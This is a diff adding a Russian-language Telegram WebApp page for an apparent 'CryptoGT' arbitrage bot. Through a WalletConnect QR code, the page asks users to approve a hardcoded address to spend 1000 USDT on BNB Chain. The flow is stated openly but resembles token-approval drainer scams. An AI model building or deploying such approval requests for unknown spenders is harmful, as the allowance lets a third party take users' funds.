@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <title>Approve 1000 USDT</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 1rem;
+      background: #f7f7f7;
+      color: #333;
+    }
+    h2 {
+      margin-top: 0;
+    }
+    #qr-container {
+      text-align: center;
+      margin-top: 1rem;
+    }
+    #status {
+      margin-top: 1rem;
+      white-space: pre-line;
+      text-align: center;
+      font-size: 0.95rem;
+    }
+    #btn-close {
+      margin: 2rem auto 0 auto;
+      display: none;
+      padding: 0.5rem 1rem;
+      background: #0088cc;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 1rem;
+      text-align: center;
+    }
+    #btn-close:hover {
+      background: #0077b3;
+    }
+  </style>
+</head>
+<body>
+  <h2>Approve 1000 USDT</h2>
+  <p>
+    Отсканируйте QR‑код в поддерживаемом кошельке (Trust Wallet, MetaMask и т. п.)<br>
+    и подтвердите транзакцию APPROVE.
+  </p>
+  <div id="qr-container">
+    <canvas id="qr-canvas"></canvas>
+  </div>
+  <div id="status">Генерируем WalletConnect v2 сессию…</div>
+  <button id="btn-close">Закрыть</button>
+
+  <!-- 1) Подключаем WalletConnect SignClient v2 из CDN -->
+  <script src="https://unpkg.com/@walletconnect/sign-client@2.21.0/dist/sign-client.umd.min.js"></script>
+  <!-- 2) Подключаем qrcode.js -->
+  <script src="https://unpkg.com/qrcode@1.5.1/build/qrcode.min.js"></script>
+
+  <script>
+    (async () => {
+      const statusEl = document.getElementById("status");
+      const qrCanvas = document.getElementById("qr-canvas");
+      const btnClose = document.getElementById("btn-close");
+
+      // Проверяем, что WebApp API доступен
+      if (!window.Telegram || !window.Telegram.WebApp) {
+        statusEl.innerText = "❌ WebApp API не доступен.";
+        return;
+      }
+      const tgWebApp = window.Telegram.WebApp;
+      tgWebApp.expand(); // разворачиваем окно WebApp
+
+      // ─── 1) ИНИЦИАЛИЗИРУЕМ WalletConnect SignClient ──────────────────
+      let client;
+      try {
+        client = await SignClient.init({
+          projectId: "d868f90cd734355ae0320f8f0258b6b1",
+          relayUrl: "wss://relay.walletconnect.com",
+          metadata: {
+            name:        "CryptoGT Bot",
+            description: "Approve USDT via WalletConnect v2",
+            url:         `https://t.me/${encodeURIComponent("@cryptogt_arbitrage_bot")}`,
+            icons:       []
+          }
+        });
+      } catch (e) {
+        statusEl.innerText = "❌ Ошибка инициализации WalletConnect:\n" + e.message;
+        return;
+      }
+      statusEl.innerText = "✔️ WalletConnect инициализирован. Создаём сессию…";
+
+      // ─── 2) СОЗДАЁМ СЕССИЮ И ПОЛУЧАЕМ URI ────────────────────────────
+      let uri, approval;
+      try {
+        const res = await client.connect({
+          requiredNamespaces: {
+            eip155: {
+              methods: ["eth_sendTransaction"],
+              chains:  ["eip155:56"],
+              events:  []
+            }
+          }
+        });
+        uri = res.uri;
+        approval = res.approval;
+      } catch (e) {
+        statusEl.innerText = "❌ Не удалось создать сессию:\n" + e.message;
+        return;
+      }
+
+      // ─── 3) РЕНДЕРИМ QR-КОД ───────────────────────────────────────────
+      try {
+        await QRCode.toCanvas(qrCanvas, uri, { width: 250, margin: 1 });
+        statusEl.innerText = "🔗 Сканируйте QR‑код в кошельке.";
+      } catch (e) {
+        statusEl.innerText = "❌ Ошибка генерации QR:\n" + e.message;
+        return;
+      }
+
+      // ─── 4) ЖДЁМ, ПОКА ПОЛЬЗОВАТЕЛЬ ПОДТВЕРДИТ СЕССИЮ ───────────────
+      let session;
+      try {
+        session = await approval();
+      } catch (e) {
+        statusEl.innerText = "❌ Сессия отменена или ошибка:\n" + e.message;
+        // Оповещаем бота об ошибке
+        tgWebApp.sendData(JSON.stringify({ status: "error", error: e.message }));
+        return;
+      }
+      statusEl.innerText = "✔️ Сессия установлена. Подготавливаем транзакцию…";
+
+      // ─── 5) ДИНАМИЧЕСКИ ПОДКЛЮЧАЕМ Web3.js (версия 1.10.1) ────────────
+      await loadScript("https://cdn.jsdelivr.net/npm/web3@1.10.1/dist/web3.min.js");
+      const web3 = new Web3("https://bsc-dataseed.binance.org/");
+
+      // ─── 6) ПОДГОТОВКА ДАННЫХ ДЛЯ APPROVE ─────────────────────────
+      const usdtAddress  = "0x55d398326f99059fF775485246999027b3197955";
+      const spenderAddr  = "0xA7acE8F572825FeD4411389Cb1A66104Cf53B577";
+      const approveValue = "1000000000000000000000"; // 1000 USDT (18 дец.)
+
+      const usdtABI = [
+        {
+          constant: false,
+          inputs: [
+            { name: "spender", type: "address" },
+            { name: "amount",  type: "uint256" }
+          ],
+          name: "approve",
+          outputs: [{ name: "", type: "bool" }],
+          type: "function"
+        }
+      ];
+      const usdtContract = new web3.eth.Contract(usdtABI, usdtAddress);
+
+      // 1) Считываем адрес пользователя из session.namespaces.eip155.accounts
+      const acct = session.namespaces.eip155.accounts.find(acc => acc.startsWith("eip155:56:"));
+      const userAddress = acct.split(":")[2];
+
+      // 2) Код approve()
+      const dataApprove = usdtContract.methods.approve(spenderAddr, approveValue).encodeABI();
+
+      // 3) Nonce, gasPrice, gasLimit
+      let nonce   = await web3.eth.getTransactionCount(userAddress, "pending");
+      let gasPrice = await web3.eth.getGasPrice();
+      let gasLimit;
+      try {
+        gasLimit = await web3.eth.estimateGas({
+          from: userAddress,
+          to:   usdtAddress,
+          data: dataApprove
+        });
+      } catch (e) {
+        statusEl.innerText = "❌ Ошибка оценки газа:\n" + e.message;
+        tgWebApp.sendData(JSON.stringify({ status: "error", error: e.message }));
+        return;
+      }
+
+      statusEl.innerText =
+        `ℹ️ Nonce: ${nonce}\n` +
+        `ℹ️ Gas price: ${web3.utils.fromWei(gasPrice, "gwei")} Gwei\n` +
+        `ℹ️ Gas limit: ${gasLimit}`;
+
+      // 4) Формируем txParams
+      const txParams = {
+        from:     userAddress,
+        to:       usdtAddress,
+        data:     dataApprove,
+        gasPrice: web3.utils.toHex(gasPrice),
+        gas:      web3.utils.toHex(gasLimit + 10000),
+        nonce:    web3.utils.toHex(nonce)
+      };
+
+      statusEl.innerText = "▶️ Отправляем транзакцию на подпись…";
+
+      // 5) Отправляем eth_sendTransaction
+      let txHash;
+      try {
+        txHash = await client.request({
+          topic:   session.topic,
+          chainId: "eip155:56",
+          request: {
+            method: "eth_sendTransaction",
+            params: [txParams]
+          }
+        });
+      } catch (e) {
+        statusEl.innerText = "❌ Ошибка отправки:\n" + e.message;
+        tgWebApp.sendData(JSON.stringify({ status: "error", error: e.message }));
+        return;
+      }
+
+      // 6) Успех: показываем хэш, отправляем боту окончательное сообщение
+      statusEl.innerHTML = `✅ APPROVE отправлен!<br><code>${txHash}</code>`;
+      tgWebApp.sendData(JSON.stringify({ status: "success", txHash }));
+      btnClose.style.display = "block";
+      btnClose.addEventListener("click", () => tgWebApp.close());
+    })();
+
+    // ─── ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ: ЗАГРУЗКА СКРИПТА ─────────────────────────
+    function loadScript(src) {
+      return new Promise((resolve, reject) => {
+        const s = document.createElement("script");
+        s.src = src;
+        s.onload  = () => resolve();
+        s.onerror = () => reject(new Error("Не удалось загрузить " + src));
+        document.head.appendChild(s);
+      });
+    }
+  </script>
+</body>
+</html>
